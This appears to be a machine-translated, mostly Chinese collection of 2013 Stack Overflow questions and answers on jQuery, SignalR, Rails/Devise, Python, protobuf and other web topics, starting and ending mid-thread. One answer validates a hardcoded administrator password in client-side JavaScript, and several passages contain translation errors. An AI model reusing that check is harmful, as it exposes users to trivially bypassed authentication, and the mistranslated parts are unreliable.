有关更详细的解释，请参阅[此](https://stackoverflow.com/questions/3384960/want-html-form-submit-to-do-nothing/3384971#3384971)对类似问题的回答。

至于从文本字段中删除值，您当前拥有的（例如下面的代码）将为此工作 - 您目前没有看到它的影响的唯一原因是页面正在重新加载，因为表单正在提交.

```
$("#username").val("");
$("#password").val(""); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:17:48.040

正如德米特里所说，你可以这样做：

```
$(form).on(
    'submit',
    function(){
        if (passwordsMatchOrWhatever){
            //do whatever a successful submission should
        } else {
            //reset field values if you want to
            return false;
        }
    }
); 
```

提交表单时，会触发“提交”事件。上面的代码使用 jQuery 附加一个函数以在发生这种情况时运行。从该函数返回 false 会取消整个提交。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T13:11:01.510

处理`onSubmit`你的功能，只是`return false`- 什么都不会发生。

```
 function authenticate(form)
      {
          if (form.username.value == "Administrator" && form.password.value == "password")
          {
             window.open('OrderList.aspx')/*opens the target page while Id & password matches*/
         }
         else 
         {
             alert("Error Password or Username")
             $("#username").val("")
             $("#password").val("")
            return false;
         }
     } 
```

# json - 使用 ServiceStack.Text 作为 SignalR 的 JSON 序列化程序

> ID：16215640
> 
> 赞同：8
> 
> 时间：2013-04-25T13:08:49.980
> 
> 标签：json, signalr

为了在我的应用程序层中实现一致的序列化，我想对 SignalR 使用与其他地方相同的序列化库 (ServiceStack.Text)。

在遵循 SignalR 的 Wiki[条目](https://github.com/SignalR/SignalR/wiki/Extensibility#replacing-the-ijsonserializer)以替换使用的 JSON 序列化程序时，我创建了这个基本处理程序：

```
public class SignalrServiceStackJsonSerializer : IJsonSerializer
{
    public void Serialize(object value, TextWriter writer)
    {
        var selfSerializer = value as IJsonWritable;
        if (selfSerializer != null)
            selfSerializer.WriteJson(writer);
        else
            JsonSerializer.SerializeToWriter(value, writer);
    }

    public object Parse(TextReader reader, Type targetType)
    {
        return JsonSerializer.DeserializeFromReader(reader, targetType);
    }
} 
```

一体化：

```
var serializer = new SignalrServiceStackJsonSerializer();
GlobalHost.DependencyResolver.Register(typeof(IJsonSerializer), () => serializer); 
```

不幸的是，在集成之后，SignalR JS 客户端确实获得了与默认序列化程序不同的包。看起来，默认序列化程序生成（至少对于非用户消息）属性上限为 1 个字符的 JSON，在将其替换为 ServiceStack.Text 后不会发生这种情况。因此，SignalR 尝试访问“I”，但它收到了“Id”。我找不到 SignalR 服务器端源代码的各个部分。

我做错了什么还是必须创建一个更复杂的包装器才能将 ServiceStack.Text 用作 JSON 序列化程序？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T16:11:06.687

我不会费心去尝试。我们对 JSON.NET 有很深的依赖，我们甚至在下一个版本中删除了这种可扩展性。对不起。

# asp.net-mvc-4 - 重构多门户解决方案asp.net mvc的方法

> ID：16215642
> 
> 赞同：0
> 
> 时间：2013-04-25T13:08:58.617
> 
> 标签：asp.net-mvc-4, projects-and-solutions, n-tier-architecture

我目前正在重构一个庞大的单体 asp.net mvc 解决方案（作为网站/门户运行）并使用

1.  通用业务逻辑（可用于创建类似门户）
2.  核心业务逻辑（可用作领域逻辑）
3.  公共存储库逻辑
4.  核心存储库逻辑
5.  门户特定的业务逻辑（如果通用业务逻辑不这样做）
6.  门户特定的存储库逻辑（如果通用存储库逻辑不这样做）

如我所见，这种方法的问题在于在引入类似门户时，如果需要，我将不得不创建其特定的业务逻辑层和存储库逻辑层，这将增加解决方案中的项目数量（担心它会消失难以管理）

我如何在可管理的项目方面实现多门户解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-06T09:15:32.347

我遇到过类似的情况，有一堆 MVC 站点共享许多常见功能。

我们所做的是首先将所有这些常见的东西隔离在一个单独的解决方案中（我们称之为“全局”）。该解决方案的结构几乎与所有 MVC 站点相同，并且还包含“全局”特定的业务逻辑、接口、实体、存储库和 UI 组件（即：页眉和页脚、登录功能……）。这些常见功能被组织在可以部署的[便携式区域](http://portableareas.codeplex.com/)中，只要您在一个 MVC 站点中需要其中一个，就可以使用专用的 Nuget 包。

为了能够测试我们开发的所有便携式区域，而无需部署它们，我们在 Global sln 中创建了一个“启动器”站点。从未部署此站点；它仅用于测试目的。

我们的 MVC 架构不是常见的 n-tiers 架构，而是[Onion](http://jeffreypalermo.com/blog/the-onion-architecture-part-1/)架构。如果您有兴趣，请查看所有[相关的 StackOverflow 问题。](https://stackoverflow.com/questions/tagged/onion-architecture)我们所有的 MVC 站点都在使用 StructureMap DI，以便在启动时将我们使用的所有接口与正确的实现绑定。Global 有自己的 DI 容器配置部分。要使事情正常运行，您唯一需要做的就是在托管可移植区域的 MVC 站点的 Global.asax 文件中调用这两个方法：

```
GlobalConfig.Init();
GlobalConfig.RegisterAllAreas(); 
```

Init 方法是 StructureMap 将所有接口与正确实现绑定的地方，而 RegisterAllAreas 方法注册可移植区域路由和捆绑包。这两个方法必须在注册 MVC 站点自己的路由、捆绑包和 DI 东西之前调用。

这是全局 sln 文件夹结构：

![全局 sln 文件夹结构](https://i.stack.imgur.com/dujcc.jpg)

Web.xxxx 项目是您需要创建的所有不同的可移植区域。即使您的 MVC 站点只需要用户帐户共享功能，最好将事物分开以避免始终需要部署所有内容。

下面仔细看看其中一个 Web.xxxx 项目结构：

![Web.xxxx 项目结构](https://i.stack.imgur.com/L7eAu.jpg)

可移植区域项目名为 xxxx.Area，它包含该区域的所有视图和控制器。它还有 xxxxAreaRegistration.cs，它定义了该区域的路线和捆绑包。

视图模型和构建器位于名为 xxxx.ViewModel 的单独项目中。

xxxx.Domain 和 xxxx.DomainModel 项目是存储该区域的所有服务实现和域模型的地方。Xxxx.Data 是该区域的存储库实现所在的位置。

所有区域服务和存储库接口都存储在 Contract 项目中（见图#1），并且可以使用特定的 Nuget 包单独部署。

这是我们在这里组织事物的方式的大图，如果您想使用这种架构，如果您需要更多信息和细节，请不要犹豫。

希望有帮助！

# ruby-on-rails - 如何将信息保存到 Devise.sessions#destroy 上的模型？

> ID：16215646
> 
> 赞同：1
> 
> 时间：2013-04-25T13:09:04.030
> 
> 标签：ruby-on-rails, devise, piggybak

我将 Devise 和 Piggybak 用于[Rails 项目](https://github.com/viniciusspader/my-auth)，Piggybak 使用名为*cart*的 cookie来存储用户购物车。问题是 Piggybak 不会破坏用户 sign_out 上的 cookie，因此，如果我与另一个用户登录，它使用相同的 cookie，因此使用相同的购物车。

我想解决将 cookie 值存储到我的用户模型中的问题，使其能够在另一个登录时取回他的购物车。我所做的是重写 Devise.sessions#destroy 方法来保存用户的 cookie 值并销毁 cookie：

```
# app/controllers/users/sessions_controller.rb

class Users::SessionsController < Devise::SessionsController

  def destroy
    current_user.add_cart_cookie(cookies['cart']['value'])
    cookies['cart'] = { value: '', path: '/' }
    super
  end
end 
```

在路线中正确路由：

```
# config/routes.rb

...

devise_for :users, controllers: { sessions: 'users/sessions' }

... 
```

`add_cart_cookie`并为我的用户模型创建方法：

```
# app/models/user.rb

class User < ActiveRecord::Base

...

  def add_cart_cookie(value)
    self.cart_cookie = value
  end

...

end 
```

但这不起作用，它会破坏 cookie 但不会将其保存在用户模型上。为什么会这样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T18:11:28.280

做到了，谢谢@Marian。

我所做的是改变我的`add_cookie_cart`方法来接受另一个参数：

```
# app/models/user.rb

class User < ActiveRecord::Base

...

  def add_cart_cookie(value, password)
    self.cart_cookie = value
    self.password = password
    self.password_confirmation = password
    self.save
  end

...

end 
```

并相应地更改了我的 session#destroy：

```
class Users::SessionsController < Devise::SessionsController

  def destroy
    current_user.add_cart_cookie(cookies['cart']['value'], current_user.password)
    cookies['cart'] = { value: '', path: '/' }
    super
  end
end 
```

# jquery - 动态 JSON 数据中的 Jquery 循环

> ID：16215647
> 
> 赞同：-1
> 
> 时间：2013-04-25T13:09:07.727
> 
> 标签：jquery, json, loops

惠..如果这个问题已经问过了，我很抱歉。我正在尝试使用 javascript/jquery 遍历 JSON 数据。JSON 数据是使用 '$.getJson' 函数检索的。我的问题是 JSON 数据将具有无限深度。很抱歉这个简短的问题。谢谢

```
{
    "title": "perkhidmatan utama agensi",
    "description": "",
    "layout": "1",
    "likerscale": "",
    "elemen": [
        {
            "title": "Sila tandakan dan nyatakan lokasi di mana Tuan/Puan menerima perkhidmatan. (Ibu Pejabat/Negeri/Cawangan)",
            "elemen": [
                {
                    "title": "lokasi perkhidmatan",
                    "description": "",
                    "elemen": [
                        {
                            "title": "ibu pejabat",
                            "checkbox": "1",
                            "radio": "0",
                            "input": "0",
                            "textarea": "0",
                            "select": "0"
                        },
                        {
                            "title": "Negeri/Cawangan (Sila nyatakan)",
                            "checkbox": "1",
                            "radio": "0",
                            "input": "1",
                            "textarea": "0",
                            "select": "0"
                        }
                    ]
                }
            ]
        },
        {
            "title": "Sila tandakan (<span class='icon icone-check'></span>) pada mana-mana ruangan berkenaan mengenai jenis perkhidmatan utama agensi ini yang pernah anda berurusan",
            "elemen": [
                {
                    "title": "perkhidmatan utama JPN",
                    "description": "",
                    "elemen": [
                        {
                            "title": "Kad Pengenalan",
                            "checkbox": "1",
                            "radio": "0",
                            "input": "0",
                            "textarea": "0",
                            "select": "0"
                        },
                        {
                            "title": "Kelahiran, Kematian dan Anak Angkat",
                            "checkbox": "1",
                            "radio": "0",
                            "input": "0",
                            "textarea": "0",
                            "select": "0"
                        },
                        {
                            "title": "Kewarganegaraan",
                            "checkbox": "1",
                            "radio": "0",
                            "input": "0",
                            "textarea": "0",
                            "select": "0"
                        },
                        {
                            "title": "Perkahwinan dan Perceraian",
                            "checkbox": "1",
                            "radio": "0",
                            "input": "0",
                            "textarea": "0",
                            "select": "0"
                        },
                        {
                            "title": "Lain-lain",
                            "checkbox": "1",
                            "radio": "0",
                            "input": "0",
                            "textarea": "0",
                            "select": "0"
                        }
                    ]
                }
            ]
        }
    ]
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:11:58.123

您在这里需要一个递归函数，应该这样做：

```
var data = yourJsonArray;

function drillDownArray(data) {
   // Main attributes
   var title = data.title;
   var description = data.description;

   $.each(data.elemen, function(i, v) {
       // Each element
       var title = v.title;
       drillDownArray(v);
   }
}

drillDownArray(data); 
```

# python - 删除特定文件的有效方法

> ID：16215651
> 
> 赞同：1
> 
> 时间：2013-04-25T13:09:25.090
> 
> 标签：python, performance, bash

我有一个 Python 程序，它为每次迭代在不同的文件夹中生成大量文件。每次迭代后，我想删除特定文件夹中的某种文件：例如，`*.recode.vcf`应删除所有具有此扩展名的文件。

我试过了

```
os.remove(example.recode.vcf) 
```

...但是由于正在查找文件的文件夹最终可能包含大量文件，我想知道哪种方法是最有效的方法。作为替代方案，我考虑过调用 bash`find`函数。就像是...

```
find . -name \*.recode.vcf -type f -delete 
```

你怎么看？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:12:37.427

如果“效率”是指速度，那么请注意此操作的速度是由文件系统（操作系统 + 硬件）决定的，而不是由实现语言决定的。您可以使用以下命令轻松删除一堆文件`glob`：

```
from glob import glob  # or iglob, see documentation

for f in glob("*.recode.vcf"):
    os.remove(f) 
```

（这不会递归到子目录；`os.walk`用于那个。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:33:00.167

首先，在寻求解决方案之前，检查您的方法之间是否真的存在差异。也许没有，您正在浪费时间来解决确实存在的问题。

当您在 python[中删除](http://docs.python.org/2/library/os.html#os.remove)一个文件时，它不会自行删除它，而是要求操作系统友好地删除该文件（这*很好*）。因此，您可以构建一个简单的函数（或者更好的是[iterator](https://stackoverflow.com/questions/231767/the-python-yield-keyword-explained)），它将递归地返回您删除的文件，这将是您的 Python 版本的`find`. 谁知道，也许`find`是用python实现的……？（好吧好吧，它不是，但它可能是）

请参阅其他答案中提到的[walk](http://docs.python.org/2/library/os.html#os.walk)和[glob](http://docs.python.org/2/library/glob.html)

**编辑：**

如果有*大量*文件，请将它们分成不同的目录。与其将 10,000 个文件塞进一个目录，不如将 100 个目录和每个 100 个文件放在一起。为了在 dirs 之间平等地平衡文件，从例如文件名或文件内容哈希的最后两个字母生成文件名（类似于[git](http://en.wikipedia.org/wiki/Git_(software))所做的）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:14:53.067

我通常喜欢密切控制我如何删除文件，所以我建议列出你要删除的所有文件，然后像这样一个一个地删除它们：

```
import glob, os
myfiles=glob.glob("/mydirectory/*.vcf")
for file in myfiles:
  os.remove(file) 
```

干杯，特隆德

# python - Replacing Selections of HTML via the Command-Line

> ID：16215652
> 
> 赞同：0
> 
> 时间：2013-04-25T13:09:25.390
> 
> 标签：python, ruby, bash, shell, unix

EDIT: I know how to do this. I'm not looking for a solution, I'm looking for a process or existing program recommendation before I take the time to write something myself in some scripting language.

I have some HTML files in various directories which all have a similar structure:

```
<html>
    <head>...</head>
    <body>
        <nav>...</nav>
        <section>...</section>
    </body>
</html> 
```

**I'd like to programmatically replace HTML sections with other sections (e.g. replace the `<nav>` block with a different `nav` block [specified in a file of my choosing]) for all the files I specify.**

I think the ideal solution would be some sort of tool using `lxml` or something similar in Python, but if there were an easy way to do it with *nixy tools, or an existing program to do this, I'd be happy to do that instead of putting together a script.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T13:17:21.600

您也许可以像这样使用 BeautifulSoup for Python。

```
import BeautifulSoup

soup = BeautifulSoup.BeautifulSoup(htmldata)
nav = soup.find("nav")
nav.name = "new name" 
```

例如：

```
import BeautifulSoup

html_data = "<nav>Some text</nav>"
soup = BeautifulSoup.BeautifulSoup(html_data)
nav = soup.find("nav")
nav.name = "nav2" 
```

将改变：`<nav></nav>`到`<nav2></nav2>`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T13:58:06.907

不要使用正则表达式或字符串解析。那些只会让你头疼。使用解析器。

在 Ruby 中，我会使用 Nokogiri：

```
require 'nokogiri'

html = '
<html>
  <body>
    <nav>...</nav>
    <section>...</section>
  </body>
</html>
'
doc = Nokogiri::HTML(html)

nav = doc.at('nav').content = "this is a new block"
puts doc.to_html 
```

哪个输出：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html><body>
    <nav>this is a new block</nav><section>...</section>
</body></html> 
```

当然你想`"this is a new block"`用类似的东西替换`File.read('snippet.html')`。

如果您的替换文件包含 HTML 片段而不是`nav`内容，请改用：

```
nav = doc.at('nav').replace('<nav>this is a new block</nav>') 
```

输出将是相同的。（同样，`File.read`如果您是这样倾斜的，请使用从文件中获取它。）

在 Nokogiri 中，`at`查找由 CSS 或 XPath 访问器指定的标记的第一个实例并返回Node.js。我在上面使用了 CSS，但`//nav`也可以。`at`猜测访问器的类型。您可以使用`at_css`or`at_xpath`如果您想具体一点，因为可能有不明确的访问器。此外，Nokogiri 有`search`，它返回一个 NodeSet，它的作用类似于一个数组。您可以按照自己的意愿迭代结果。并且，分别`at`有 CSS 和 XPath 特定版本。`css``xpath`

Nokogiri 有一个 CLI 界面，对于像这个例子这样简单的东西，它可以工作，但我也可以在 sed 或 Ruby/Perl/Python 单线器中完成。

```
curl -s http://nokogiri.org | nokogiri -e'p $_.css("h1").length' 
```

尽管 HTML 很少这么简单，尤其是在野外漫游的任何东西，CLI 或单行解决方案将迅速失控，或者干脆死掉。我说，基于多年编写许多爬虫和 RSS 聚合器的经验——当你引入一个额外的 HTML 或 XML 源时，一开始很简单的事情会变得更加复杂，而且它永远不会变得更容易。使用解析器教会我先去找他们。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-26T04:02:59.290

我最终编写了自己的小命令行工具来做我想做的事。它适用于我的用例，我打算随着时间的推移对其进行改进。它在 GitHub 上：[trufflepig](https://github.com/ihodes/trufflepig)。

我希望它也可以对其他人有用。

# javascript - 使用rabbitmq stomp发送protobuf（二进制）数据

> ID：16215656
> 
> 赞同：3
> 
> 时间：2013-04-25T13:09:36.000
> 
> 标签：javascript, rabbitmq, protocol-buffers, stomp, content-length

我在客户端使用 protobuf.js 为rabbitmq stomp 创建了一个示例。protobuf 示例链接：[https ://github.com/dcodeIO/ProtoBuf.js](https://github.com/dcodeIO/ProtoBuf.js)

**发送消息文件内容：-**

```
var Game = builder.build("Game");
var Car = Game.Cars.Car;
var car = new Car("Rusty", "mayur");
var buffer = car.encode();      

var mq_username = "guest",
mq_password = "guest",
mq_vhost    = "/",
mq_url      = 'http://192.168.0.14:15674/stomp',
mq_queue1 = '/queue/A3';
var client = Stomp.client(mq_url);
function on_connect() 
{

client.send(mq_queue1, { priority: 9}, buffer); 

}
window.onload = function () 
{
client.connect(
        mq_username,
        mq_password,
        on_connect,
        on_connect_error,
        mq_vhost
      );    

} 
```

**接收文件内容：-**

```
 var Game = builder.build("Game");
  var Car = Game.Cars.Car;
  var car = new Car("Rusty", "mayur");
  var buffer = car.encode();        

  var mq_username = "guest",
  mq_password = "guest",
  mq_vhost    = "/",
  mq_url      = 'http://192.168.0.14:15674/stomp',
  mq_queue1 = '/queue/A3';
  var client = Stomp.client(mq_url);
  function on_connect() 
  {
        un = client.subscribe(mq_queue1, on_message);

  }
function on_message(m) 
{
  console.log('message received'); 
  console.log(m);
  var buffer = m.body;
  alert(buffer);                     
  var carDec =Car.decode(buffer);                         
  alert(carDec.model);

}
  window.onload = function () 
  {
        client.connect(
            mq_username,
            mq_password,
            on_connect,
            on_connect_error,
            mq_vhost
          );    

  } 
```

我无法解码 stomp（protobuf 二进制数据）发送的数据。如果问题通过**"content-length"**解决，请指导我将**"content-length"**设置为**stomp header**。

 ****请帮我。没有人知道这件事吗？**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-06-09T12:38:52.107

我知道我会在 2 年后回答！但我想我应该分享:)

我正在开发一个使用rabbitmq stomp 发送ProtoBuf 编码数据的项目。

我遇到了同样的问题：我可以发送但无法在接收端解码。

我只需使用另一种编码即可使其工作：

*   改变：

    ```
    var buffer = car.encode(); 
    ```

    至：

    ```
    var buffer = car.encode64(); 
    ```

*   改变：

    ```
    var carDec =Car.decode64(buffer); 
    ```

    至：

    ```
    var carDec =Car.decode64(buffer); 
    ```

这解决了我的问题，我希望它也解决了你的问题。**

# php - 上次 php 会话更长

> ID：16215665
> 
> 赞同：0
> 
> 时间：2013-04-25T13:09:58.987
> 
> 标签：php, session

几个月来，我制作了 RPG 待办事项/习惯/项目管理系统（游戏）。问题是会话的长度非常短。

我检查了 facebook 登录脚本，但它有 1 年的有效期。所以问题不在这里。

[http://rpgtasks.igloro.info](http://rpgtasks.igloro.info)

我找不到应该增加长度的正确位置。主机不是我的，但我为主机付费。我应该问他们吗？

从这里的phpinfo： [http ://rpgtasks.igloro.info/phpinfo.html](http://rpgtasks.igloro.info/phpinfo.html)

我们可以看到 session.cache_expire 设置为 180。是 php session 吗？我应该增加它吗？

感谢帮助

# signal-processing - 通过网络传输实时加速度计/指南针数据的格式

> ID：16215666
> 
> 赞同：0
> 
> 时间：2013-04-25T02:28:55.517
> 
> 标签：signal-processing, compass-geolocation, data-compression

将加速度计/罗盘数据历史传输到服务器的最佳方式是什么？

我有一个非常基本的 Android 应用程序，可以将 GPS 点数据传输到 Web 服务器。我现在想将加速度计/罗盘数据与这些 GPS 坐标一起包括在内。这个想法是为了更好地了解设备所走的路径以及它在旅途中所经历的力量。

我不想错过快速的加速度计事件，例如急剧颠簸。但是我可以看到这会导致通过网络发送大量（可能是冗余的）数据。

是否有存储/传输此类数据的标准化格式？

谢谢，戴夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T08:12:14.600

通过串行线路传输*实时*GPS 和罗盘数据的常用标准是[NMEA 0183](http://en.wikipedia.org/wiki/NMEA_0183)。
这甚至可能是您的 GPS 在内部与 Android 对话的方式。它也经常用于网络连接。该格式基于每个样本的一行 ASCII 文本，每行中的字段由逗号分隔。

但是，由于您对记录旅行信息（位置、方向和加速度）的*历史*感兴趣，因此没有必要记录*每个样本*。相反，将采样率降低到可以接受的水平——也许每分钟一条记录，甚至每十分钟一条记录。在每条记录中，存储每个值的**平均值、****标准差**和**最大值**。这样，您就不会错过“急剧颠簸”，因为它们会显示在加速度的“最大”值中。

您存储这些数据的格式可能并不重要，您应该选择方便和自然的格式。正如评论者所提到的，您可能还想研究[GeoJSON](http://en.wikipedia.org/wiki/GeoJSON)，或者只是自己制作一个合适的格式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T08:22:07.547

关于加速度计。陀螺仪、加速度计和指南针等运动传感器在 3 轴 (xyz) 上输出原始 DAC 测量值，这些值通常是 16 位带符号的。还有一个选项可以将这些值转换为 4 元素四元数向量。

# arrays - In octave, what gives with literal structs?

> ID：16215669
> 
> 赞同：0
> 
> 时间：2013-04-25T13:10:25.933
> 
> 标签：arrays, string, struct, octave

when I do this:

```
pedigree = struct('parents', [0,0;1,3;0,0]);
pedigree.names = {'Ira','James','Robin'}; 
```

I get a different thing to when I do this:

```
pedigree = struct('parents', [0,0;1,3;0,0], 'names', {'Ira','James','Robin'}); 
```

What are the two things, how are they different, is there a literal form for whatever is made by the first thing, and more generally, what are the words for whatever is going on?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T21:20:48.343

问题是结构也是一个数组。`struct`当您使用命令创建结构时

```
pedigree = struct('parents', [0,0;1,3;0,0], 'names', {'Ira','James','Robin'}); 
```

each 的值应该是一个元胞数组，一个元胞数组的每个元素都被分配。这样做是将矩阵分别设置`[0 0; 1 3; 0 0]`为 all `pedigree.parents`、和`Ira`、`James`和`Robin`、`pedigree(1).names`和。要做你想做的，只需传递一个带有单个元素的单元格数组：`pedigree(2).names``pedigree(3).names`

```
pedigree = struct ("parents", [0,0;1,3;0,0],
                   "names", {{'Ira','James','Robin'}}); 
```

请注意元胞数组本身如何包含元胞数组，因此在这种情况下，您有一个具有单个元素的元胞数组（也是一个元胞数组）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-28T21:12:11.283

在这里可以找到很多启示：

[https://www.gnu.org/software/octave/doc/interpreter/Data-Containers.html#Data-Containers](https://www.gnu.org/software/octave/doc/interpreter/Data-Containers.html#Data-Containers)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-29T04:32:27.850

在这里可以找到很多启示：

[http://abandonmatlab.wordpress.com/2009/08/12/programatically-creating-a-struct/](http://abandonmatlab.wordpress.com/2009/08/12/programatically-creating-a-struct/)

# python - 如何构建使用 GUI 的程序？

> ID：16215677
> 
> 赞同：1
> 
> 时间：2013-04-25T13:10:56.623
> 
> 标签：python, gtk3, pygobject

大约 2 周前，我刚刚开始使用 Python。现在，我正在尝试使用 Glade 使用 PyGObject 创建 GUI。

但是，我对程序的总体布局应该如何感到困惑。

我应该为主程序和信号使用一个类还是应该将它们分开？

对此有“最佳方法”吗？

或者就像我下面的谦虚方法一样，我根本不应该使用类吗？

在下面的示例中，我如何在函数之间进行通信？例如，如何将函数的`parent`参数设置`Gtk.MessageDialog`为程序的主窗口？

蟒蛇代码：

```
#!/usr/bin/python

try:
    from gi.repository import Gtk
except:
    print('Cannot Import Gtk')
    sys.exit(1)

# Confirm and exit when Quit button is clicked.
def on_button_quit_clicked(widget):
    confirmation_dialog = Gtk.MessageDialog(parent = None,
                                            flags = Gtk.DialogFlags.DESTROY_WITH_PARENT,
                                            type = Gtk.MessageType.QUESTION,
                                            buttons = Gtk.ButtonsType.YES_NO,
                                            message_format = 
                                            'Are you sure you want to quit?')
    print ('Quit confirmation dialog is running.')
    confirmation_response = confirmation_dialog.run()                                              
    if confirmation_response == Gtk.ResponseType.YES:
        print ('You have clicked on YES, quiting..')
        Gtk.main_quit()
    elif confirmation_response == Gtk.ResponseType.NO:
        print ('You have clicked on NO')
    confirmation_dialog.destroy()
    print ('Quit confirmation dialog is destroyed.')

# Show About dialog when button is clicked.
def on_button_about_clicked(widget):
    print ('About')

# Perform addition when button is clicked.
def on_button_add_clicked(widget):
    print ('Add')

# Main function
def main():
    builder = Gtk.Builder()
    builder.add_from_file('CalculatorGUI.glade')

    signalHandler = {
    'on_main_window_destroy': Gtk.main_quit,
    'on_button_quit_clicked': on_button_quit_clicked,
    'on_button_about_clicked': on_button_about_clicked,
    'on_button_add_clicked': on_button_add_clicked
    }
    builder.connect_signals(signalHandler)

    main_window = builder.get_object('main_window')  
    main_window.show_all()

    Gtk.main()
    print ('Program Finished!')

# If the program is not imported as a module, then run.
if __name__ == '__main__':
    main() 
```

`CalculatorGUI.glade`文件成分：http: [//pastebin.com/K2wb7Z4r](http://pastebin.com/K2wb7Z4r)

程序截图：

![在此处输入图像描述](https://i.stack.imgur.com/apSK6.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T14:14:48.427

我会使用类，这样你可以保持应用程序的状态/变量在方法之间共享。您的应用程序的具体设计取决于您的需求。这是我个人简单应用程序的基本模板：

```
# -*- coding:utf-8 -*-
#
# Copyright (C) 2013 Carlos Jenkins <cjenkins@softwarelibrecr.org>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""
PyGObject example with Glade and GtkBuilder.

Check dependencies are installed:

    sudo apt-get install python2.7 python-gi gir1.2-gtk-3.0

To execute:

    python main.py

Python reference still unavailable, nevertheless C reference documentation is
available at:

    https://developer.gnome.org/gtk3/

And a good tutorial at:

    https://python-gtk-3-tutorial.readthedocs.org/en/latest/index.html

"""

from gi.repository import Gtk
from os.path import abspath, dirname, join

WHERE_AM_I = abspath(dirname(__file__))

class MyApp(object):

    def __init__(self):
        """
        Build GUI
        """

        # Declare states / variables
        self.counter = 0

        # Build GUI from Glade file
        self.builder = Gtk.Builder()
        self.glade_file = join(WHERE_AM_I, 'gui.glade')
        self.builder.add_from_file(self.glade_file)

        # Get objects
        go = self.builder.get_object
        self.window = go('window')
        self.button = go('button')

        # Connect signals
        self.builder.connect_signals(self)

        # Configure interface
        self.window.connect('delete-event', lambda x,y: Gtk.main_quit())

        # Everything is ready
        self.window.show()

    def _btn_cb(self, widget, data=None):
        """
        Button callback
        """
        self.counter += 1
        print('Button pressed {} times.'.format(self.counter))

if __name__ == '__main__':
    gui = MyApp()
    Gtk.main() 
```

您可以在要点[https://gist.github.com/carlos-jenkins/5467657查看完整模板](https://gist.github.com/carlos-jenkins/5467657)

而且，如果您以正确的方式学习并立即使用 Glade，那么您将学习得更好，这将对您有很大帮助并降低代码复杂性，否则会受到不必要且难以维护的代码的困扰。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:45:48.657

对于刚开始使用 python 编程的人，我强烈建议尝试手动编写 GUI，而不是使用 GLADE、wxGLADE 等工具...

以艰难的方式做到这一点将教会您有关程序结构的所有知识。尤其是像这样的简单程序。

# css - 溢出 div IE 8 中的旋转错误

> ID：16215678
> 
> 赞同：1
> 
> 时间：2013-04-25T13:11:00.397
> 
> 标签：css, internet-explorer, internet-explorer-8, rotation

我有一个 div，其中包含一个图像，每当用户单击缩放底部时，该图像都必须旋转。用户单击链接后，保存图像的 div 以 100 z-index（到顶部）显示。图像在该 div 中有一个容器，用于在放大时出现滚动条（这意味着保存图像的 div 溢出：滚动；）

但是这里的问题是：

如果用户将图像缩放到 300，则滚动激活，但是，一旦单击旋转，X 滚动就不会出现，这会导致仅显示图像的一部分。如果图像'withd 大于 div 容器，即溢出：滚动，x 滚动应该让我向左或向右滚动以完整查看图像。

这里是现场示例：

![在此处输入图像描述](https://i.stack.imgur.com/i9LUr.png)

这是我的代码：

CSS：

```
#img_container {
    overflow-x:scroll;

    overflow-y:scroll;

    position:relative;

    width:800px;

    height:500px;
    }

/*the rotation code*/

    #rotate_80deg {

    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=1);
    } 
```

HTML：

```
<div id="image-Viewer">
  <div id="image_container><img src="src..." />
</div> 
```

# ruby-on-rails - 从控制器内部的循环中传递值以查看

> ID：16215681
> 
> 赞同：0
> 
> 时间：2013-04-25T13:11:02.397
> 
> 标签：ruby-on-rails

为简单起见，我使用一个简单的示例。

我有一个控制器方法：

```
def test

  @books.each do |book|
    @book_id = "EMI:#{book.id}"
    @book_test = ....(some function)
  end

end 
```

如何将循环中的“@book_id”和“@book_test”值传递到视图页面？

请注意，我不想在视图页面中重复代码。只想将循环中的值传递给视图页面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:20:22.803

您在测试方法中有@books，那么为什么要在该方法中创建循环？直接在您的视图文件中执行此操作，无需重复。

或者以其他方式制作两个数组，例如 @book_ids 和 @book_tests 并收集您准备好的值并在您的视图中使用它们，如下所示：

```
def test
@book_ids=[]
@book_tests=[]
@books.each do |book|
@book_ids << "EMI:#{book.id}"
@book_tests << ....(some function)
end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:30:13.230

你的控制器需要做它应该做的不必要的工作。

从我在问题中看到的情况来看，模特的工作更好

```
class Book < ActiveRecord::Base

  def book_id
    "EMI:#{self.id}"
  end

  def book_tests
    "some function"
  end
end

# Then in the view
@books.each |book| do
   book.book_id
   book.book_tests
end 
```

这样不是更干净吗？

# android - Monodroid - 处理 ListAdapter 行内的点击事件

> ID：16215686
> 
> 赞同：9
> 
> 时间：2013-04-25T13:11:11.583
> 
